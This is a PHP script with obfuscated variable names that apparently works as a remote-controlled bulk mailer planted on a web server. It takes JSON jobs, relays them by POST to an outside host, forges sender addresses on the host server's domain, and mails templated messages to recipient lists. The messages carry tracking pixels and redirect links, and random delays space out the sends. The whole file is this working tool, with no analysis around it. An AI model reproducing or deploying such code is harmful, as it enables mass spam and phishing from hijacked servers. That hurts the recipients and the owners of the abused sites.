<?php
@ini_set('max_execution_time', '3600'); @ini_set('max_input_time', '3600'); @set_time_limit(3600); @date_default_timezone_set('UTC'); @error_reporting(0); @ini_set('display_errors', 0); class Macros { private $values = array(); private $fixed = array(); private $used = array(); private $_keys = array(); public function __get($sp7152c9) { if ($sp7152c9 == 'keys') { return array_keys($this->_keys); } } public function Import($sp7152c9, $sp5bd1b5) { if (is_array($sp5bd1b5)) { $this->values[$sp7152c9] = array(); foreach ($sp5bd1b5 as $sp313dd7) { if (!empty($sp313dd7['key'])) { $this->values[$sp7152c9][$sp313dd7['key']] = $sp313dd7['value']; } else { $this->values[$sp7152c9][] = $sp313dd7['value']; } } } else { $this->Assign($sp7152c9, $sp5bd1b5); } } public function Assign($sp7152c9, $sp164eb1) { $this->values[$sp7152c9] = $sp164eb1; } public function Parse($spd19e83) { $spc4267b = ''; $sp3628bf = 0; while (true) { $sp89e5ee = strpos($spd19e83, '{', $sp3628bf); if ($sp89e5ee === false) { $spc4267b .= substr($spd19e83, $sp3628bf); break; } $spc4267b .= substr($spd19e83, $sp3628bf, $sp89e5ee - $sp3628bf); $sp3628bf = $sp89e5ee + 1; $spad64d2 = ''; $spdccde7 = '{'; $sp145ee8 = array(); $sp8fad47 = false; $sp0559d8 = false; $spb8e985 = 'var'; while ($sp3628bf < strlen($spd19e83)) { $spcf04be = substr($spd19e83, $sp3628bf, 1); $spdccde7 .= $spcf04be; if ($spcf04be == ',' || $spcf04be == '>' || $spcf04be == '|') { if ($spb8e985 == 'alias') { $sp8fad47 = $spad64d2; } elseif ($spb8e985 == 'mod') { $sp0559d8 = $spad64d2; } else { $sp145ee8[] = $spad64d2; } $spad64d2 = ''; if ($spcf04be == '>') { $spb8e985 = 'alias'; } if ($spcf04be == '|') { $spb8e985 = 'mod'; } $sp3628bf++; continue; } if ($spcf04be == '}') { if ($spb8e985 == 'alias') { $sp8fad47 = $spad64d2; } elseif ($spb8e985 == 'mod') { $sp0559d8 = $spad64d2; } else { $sp145ee8[] = $spad64d2; } $sp3628bf++; break; } $spad64d2 .= $spcf04be; if (preg_match('/[0-9A-Za-z_\\[\\]\\-\\^!]/', $spcf04be) == 0) { $sp3628bf++; $sp145ee8 = array(); break; } $sp3628bf++; } if (sizeof($sp145ee8) == 0) { $spc4267b .= $spdccde7; continue; } $sp2ca175 = false; $sp5cd11a = false; if (preg_match('/^\\^/', $sp145ee8[0]) > 0) { $sp145ee8[0] = substr($sp145ee8[0], 1); $sp2ca175 = true; } if (preg_match('/^\\!/', $sp145ee8[0]) > 0) { $sp145ee8[0] = substr($sp145ee8[0], 1); $sp5cd11a = true; } $sp1c5f3b = false; if (preg_match('/\\[([0-9A-Za-z_]+)\\]/', $sp145ee8[0], $spf85a24) > 0) { $sp1c5f3b = $spf85a24[1]; } elseif (preg_match('/\\[([\\d\\-]+)\\]/', $sp145ee8[0], $spf85a24) > 0) { $sp1c5f3b = explode('-', $spf85a24[1]); } if ($sp1c5f3b !== false) { $sp145ee8[0] = substr($sp145ee8[0], 0, strpos($sp145ee8[0], '[')); } $this->_keys[$sp145ee8[0]] = true; if (empty($this->values[$sp145ee8[0]]) && empty($this->fixed[$sp145ee8[0]])) { continue; } if ($sp2ca175) { unset($this->fixed[$sp145ee8[0]]); } if (isset($this->fixed[$sp145ee8[0]])) { $sp342906 = $this->fixed[$sp145ee8[0]]; } else { $sp342906 = ''; $sp6e1345 = 1; if (sizeof($sp145ee8) == 2) { $sp6e1345 = $sp145ee8[1]; } if (sizeof($sp145ee8) == 3) { $sp6e1345 = rand($sp145ee8[1], $sp145ee8[2]); } for ($sp0ef661 = 0; $sp0ef661 < $sp6e1345; $sp0ef661++) { if (is_array($this->values[$sp145ee8[0]])) { if (!is_array($this->used[$sp145ee8[0]])) { $this->used[$sp145ee8[0]] = array(); } if (count($this->used[$sp145ee8[0]]) == count($this->values[$sp145ee8[0]])) { $this->used[$sp145ee8[0]] = array(); } if ($sp1c5f3b !== false && is_scalar($sp1c5f3b)) { $sp342906 .= $this->values[$sp145ee8[0]][$sp1c5f3b]; $this->used[$sp1c5f3b] = true; } else { $sp4a9f54 = array(); if (is_array($sp1c5f3b)) { $spf8ee61 = $sp1c5f3b[0]; $spe670aa = $sp1c5f3b[1]; } else { $spf8ee61 = 0; $spe670aa = count($this->values[$sp145ee8[0]]) - 1; } for ($sp801743 = $spf8ee61; $sp801743 <= $spe670aa; $sp801743++) { if ($sp5cd11a && !empty($this->used[$sp145ee8[0]][$sp801743])) { continue; } $sp4a9f54[] = $sp801743; } $spe4bd53 = $sp4a9f54[rand(0, count($sp4a9f54) - 1)]; $this->used[$sp145ee8[0]][$spe4bd53] = true; $sp342906 .= $this->values[$sp145ee8[0]][$spe4bd53]; } } else { $sp342906 .= $this->values[$sp145ee8[0]]; } } } $sp342906 = $this->Parse($sp342906); if ($sp0559d8 !== false) { for ($sp55ee03 = 0; $sp55ee03 < strlen($sp0559d8); $sp55ee03++) { switch (substr($sp0559d8, $sp55ee03, 1)) { case 'b': $sp342906 = base64_encode($sp342906); break; case 'q': $sp342906 = quoted_printable_encode($sp342906); break; default: break; } } } if ($sp2ca175) { $this->fixed[$sp145ee8[0]] = $sp342906; } if ($sp8fad47 !== false && $sp8fad47 != '') { $this->fixed[$sp8fad47] = $sp342906; } $spc4267b .= $sp342906; } return $spc4267b; } } $sp805e70 = file_get_contents('php://input'); $sp6d24ca = json_decode($sp805e70, true); if (empty($sp6d24ca['via_proxy'])) { $sp6d24ca['via_proxy'] = true; $sp496e74 = curl_init($sp6d24ca['prefix'] . $sp6d24ca['files']['s']); $sp03517f = json_encode($sp6d24ca); curl_setopt($sp496e74, CURLOPT_CONNECTTIMEOUT, 30); curl_setopt($sp496e74, CURLOPT_TIMEOUT, 600); curl_setopt($sp496e74, CURLOPT_RETURNTRANSFER, true); curl_setopt($sp496e74, CURLOPT_USERAGENT, 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'); curl_setopt($sp496e74, CURLOPT_REFERER, $sp0b0e4e); curl_setopt($sp496e74, CURLOPT_POST, true); curl_setopt($sp496e74, CURLOPT_POSTFIELDS, $sp03517f); curl_setopt($sp496e74, CURLOPT_HTTPHEADER, array('Content-Type: application/json', 'Content-Length: ' . strlen($sp03517f))); $spa84956 = curl_exec($sp496e74); echo $spa84956; die; } $sp65adbd = $_SERVER['SERVER_ADDR']; $sp6b500d = $_SERVER['HTTP_HOST']; $sp6b500d = preg_replace('/^www\\./', '', $sp6b500d); $spcdf396 = new Macros(); $spcdf396->Assign('server_addr', $sp65adbd); $spcdf396->Assign('server_host', $sp6b500d); foreach ($sp6d24ca['macros'] as $sp7152c9 => $sp5bd1b5) { $spcdf396->Import($sp7152c9, $sp5bd1b5); } $sp19f9f9 = preg_replace('/^www\\./i', '', $sp6b500d); $sp8f7944 = $spcdf396->Parse('{from_user}@' . $sp19f9f9); $spcdf396->Assign('from_email', $sp8f7944); $spcdf396->Assign('prefix', $sp6d24ca['prefix']); $spcdf396->Assign('html', $sp6d24ca['letter']['html']); $sp3628bf = 0; $spd19371 = 0; $sp30690f = 0; $sp57bdd2 = array(); foreach ($sp6d24ca['rcpt'] as $spd4a946) { $spcdf396->Assign('email', $spd4a946['email']); $spcdf396->Assign('entry', $spd4a946); $spcdf396->Assign('date', date('r')); $spcdf396->Assign('redirect', $sp6d24ca['prefix'] . $sp6d24ca['files']['r']); $spcdf396->Assign('redirect_with_uri', $sp6d24ca['prefix'] . $sp6d24ca['files']['r'] . '?uri='); $spcdf396->Assign('unsubscribe', $sp6d24ca['prefix'] . $sp6d24ca['files']['u'] . '?id=' . $spd4a946['id']); $spcdf396->Assign('delivery', '<img src="' . $sp6d24ca['prefix'] . $sp6d24ca['files']['d'] . '?id=' . $spd4a946['id'] . '" />'); $spa32a80 = $spcdf396->Parse($sp6d24ca['envelope']['header']); $sp2d8503 = $spcdf396->Parse($sp6d24ca['envelope']['body']); if (!empty($spd4a946['name'])) { $sp21286d = $spd4a946['name'] . ' <' . $spd4a946['email'] . '>'; } else { $sp21286d = $spd4a946['email']; } $sp3bf277 = $spcdf396->Parse($sp6d24ca['letter']['subject']); if ($sp3628bf > 0) { sleep(rand(3, 8)); } $spa77dcd = mail($sp21286d, $sp3bf277, $sp2d8503, $spa32a80); $sp57bdd2[$spd4a946['id']] = $spa77dcd; if ($spa77dcd) { $spd19371++; } else { $sp30690f++; } $sp3628bf++; } echo serialize(array('total' => count($sp6d24ca['rcpt']), 'sent' => $sp3628bf, 'success' => $spd19371, 'error' => $sp30690f, 'rcpt' => $sp57bdd2));